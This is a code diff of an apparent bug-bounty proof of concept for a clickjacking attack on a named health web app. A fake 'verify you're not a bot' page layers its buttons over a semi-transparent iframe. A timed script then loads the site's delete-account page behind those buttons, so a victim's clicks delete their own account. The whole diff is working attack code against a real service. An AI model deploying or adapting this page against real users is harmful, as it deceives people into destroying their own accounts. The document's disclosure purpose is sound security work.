@@ -23,7 +23,7 @@
             width: 100%;
             position: absolute;
             z-index: 1;
-            opacity: 0.5;
+            opacity: 0.3;
         }
 
         #doubleClickButton {
@@ -35,11 +35,10 @@
             right: 0;
             margin: auto;
             height: 70px;
-            width: 70px;
-            border-radius: 50%;
+            width: 270px;
         }
 
-        #deleteButton {
+        #deleteButton1 {
             position: absolute;
             top: 20px;
             bottom: 0;
@@ -50,18 +49,51 @@
             width: 270px;
             display: none;
         }
+
+        #deleteButton2 {
+            position: absolute;
+            top: 70px;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            margin: auto;
+            height: 70px;
+            width: 270px;
+            display: none;
+        }
+
+        #verificationText {
+            text-align: center;
+            font-size: 2rem;
+            height: 100vh;
+            width: 100vw;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding-top: 7rem;
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 3rem;
+            padding-top: 3rem;
+        }
     </style>
 </head>
 
 <body>
     <iframe id="oliviaIframe" src="https://app.oliviahealth.ai/home"></iframe>
-    <button id="doubleClickButton" onclick="handleButton()">Double Click to Start Verification</button>
-    <button id="deleteButton">Double Click to Start Verification</button>
+    <h1>PoC Created By: n30@bugcrowdninja.com</h1>
+    <p id="verificationText">In order to access this site, verify you're not a bot by clicking the button(s) above:</p>
+    <button id="doubleClickButton" onclick="handleButton()">Verification Button: 1/3</button>
+    <button id="deleteButton1">Verification Button: 2/3</button>
+    <button id="deleteButton2">Verification Button: 3/3</button>
 </body>
 <script>
     const doubleClickButton = document.getElementById("doubleClickButton");
     const iframe = document.getElementById("oliviaIframe")
-    const deleteButton = document.getElementById("deleteButton")
+    const deleteButton1 = document.getElementById("deleteButton1")
+    const deleteButton2 = document.getElementById("deleteButton2")
 
     const handleButton = step => {
         // Hide Double click button
@@ -71,7 +103,14 @@
         iframe.src = "https://app.oliviahealth.ai/account/delete-account"
 
         // Show delete button
-        deleteButton.style = "display: inline-block; z-index: -1;"
+        deleteButton1.style = "display: inline-block; z-index: -1;"
+
+        setTimeout(() => {
+            // Hide delete button
+            deleteButton1.style = "display: none"
+            // Show second delete button
+            deleteButton2.style = "display: inline-block; z-index: -1;"
+        }, 2500)
 
         return
     }
